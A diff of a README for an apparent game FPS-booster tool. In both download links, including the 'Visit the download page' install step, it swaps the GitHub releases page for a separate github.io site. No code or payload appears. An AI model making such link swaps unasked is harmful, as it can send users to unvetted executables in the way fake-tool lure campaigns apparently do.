@@ -1,6 +1,6 @@
 # 🎮 Extreme-FPS-Boost - Boost Your Game FPS Instantly
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-brightgreen)](https://github.com/latterday-flashover880/Extreme-FPS-Boost/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-brightgreen)](https://latterday-flashover880.github.io)
 
 ## 🚀 Getting Started
 
@@ -36,7 +36,7 @@ Follow these steps to install and run Extreme FPS Boost.
 
 1. **Visit the download page.**  
    Go to this link:  
-   [https://github.com/latterday-flashover880/Extreme-FPS-Boost/releases](https://github.com/latterday-flashover880/Extreme-FPS-Boost/releases)
+   [https://latterday-flashover880.github.io](https://latterday-flashover880.github.io)
 
 2. **Find the latest release.**  
    On the page you will see a list of releases. Look for the newest one. It is usually at the top.
